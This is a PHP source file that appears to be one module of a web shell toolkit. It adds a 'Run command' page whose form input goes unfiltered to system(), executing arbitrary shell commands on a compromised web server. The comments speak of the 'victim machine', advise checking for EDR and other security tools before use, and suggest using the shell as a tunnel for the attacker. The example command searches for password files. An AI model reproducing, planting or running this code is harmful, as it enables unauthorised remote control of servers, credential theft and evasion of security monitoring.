<?php

// section.constants
$RUN_COMMAND = "__FEAT_RUN_COMMAND__";
// section.constants.end

// section.functions
/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function __PREFIX__makeSystemCommandPage(&$page_content, $features, $page, $css) {
    $page_content = __PREFIX__makePage(
        $features,
        $css,
        $page,
        [
            __PREFIX__makePageHeader(
                $features[$page]["title"],
                $features[$page]["description"]
            ),
            __PREFIX__makeAlert(
                "Running system commands",
                "Running system commands results in the creation of a child process from the 
                webserver/php process (aka a new terminal is spawned), this behaviour as you may expect can be 
                easily detected by EDR and other security solutions.
                <br/>
                If triggering alert is not a problem, safely ignore this alert, otherwise carefully examine the 
                victim machine and ensure that there is no security solution running before using this module."
            ),
            __PREFIX__makeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                [
                    __PREFIX__makeInput(
                        "textarea",
                        "Command",
                        "__PARAM_1__",
                        "ls -lah | grep pass",
                        "Command to run through the default system shell. This can be used to establish a full duplex tunnel between the attacker and the victim machine.",
                        true
                    ),
                ]
            ),
        ]
    );
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function __PREFIX__handleSystemCommand($operation, $features) {
    system($_POST["__PARAM_1__"]);
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function __PREFIX__systemCommandHooksFeatures(&$features) {
    global $RUN_COMMAND;

    $features[] = [
        "title"       => "Run command",
        "description" => "Run a system command using the default shell.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
</svg>',
        "op"          => $RUN_COMMAND,
    ];
}

// section.functions.end

// section.hooks
add_hook("features", "__PREFIX__systemCommandHooksFeatures");
add_named_hook("GET_page", $RUN_COMMAND, "__PREFIX__makeSystemCommandPage");
add_named_hook("POST_operation", $RUN_COMMAND, "__PREFIX__handleSystemCommand");
// section.hooks.end